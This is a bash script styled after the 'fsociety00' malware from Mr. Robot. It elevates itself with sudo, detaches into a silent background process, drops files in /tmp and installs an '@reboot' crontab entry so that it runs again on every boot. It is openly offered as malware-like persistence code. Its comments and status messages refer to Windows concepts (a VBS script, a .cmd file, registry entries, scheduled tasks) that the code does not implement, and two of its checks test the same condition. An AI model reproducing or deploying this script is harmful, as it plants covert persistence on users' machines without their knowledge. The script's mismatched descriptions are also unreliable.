#!/bin/bash

# checks if its running as admin or not and if it isn't it will restart and run it as admin using  a vbs script
if [ "$EUID" -ne 0 ]; then
    sudo "$0" "$@"
    exit $?
fi

# target directory for fsociety00 its gonna be in temp mainly cuz thats where alot of malware hides
targetDir="/tmp/fsociety00"
mkdir -p "$targetDir"

# opens to the directory after creation
cd "$targetDir" || exit

if [ "$1" != "-silent" ]; then
    nohup "$0" -silent >/dev/null 2>&1 &
    exit 0
fi

# Readme.txt file just like the fsociety lol
echo "-----readme.txt-----" > readme.txt
echo "" >> readme.txt
echo "LEAVE ME HERE" >> readme.txt
echo "" >> readme.txt
echo "-----readme.txt-----" >> readme.txt

# The actual fsociety00 cmd payload script whatever
cat <<EOF > fsociety00.sh
#!/bin/bash
(crontab -l 2>/dev/null | grep -q "fsociety00") || (crontab -l 2>/dev/null; echo "@reboot $targetDir/fsociety00.sh") | crontab -
EOF

chmod +x fsociety00.sh
./fsociety00.sh >/dev/null 2>&1 &

if [ -f "$targetDir/fsociety00.sh" ]; then
    echo "fsociety00.cmd created successfully in $targetDir"
else
    echo "Failed to create fsociety00.cmd in $targetDir"
fi

if crontab -l 2>/dev/null | grep -q "fsociety00"; then
    echo "Registry entry for fsociety00 created successfully"
else
    echo "Failed to create registry entry for fsociety00"
fi

if crontab -l 2>/dev/null | grep -q "fsociety00"; then
    echo "Scheduled task for fsociety00 created successfully"
else
    echo "Failed to create scheduled task for fsociety00"
fi
echo "thx for using Fsociety00"
exit 0
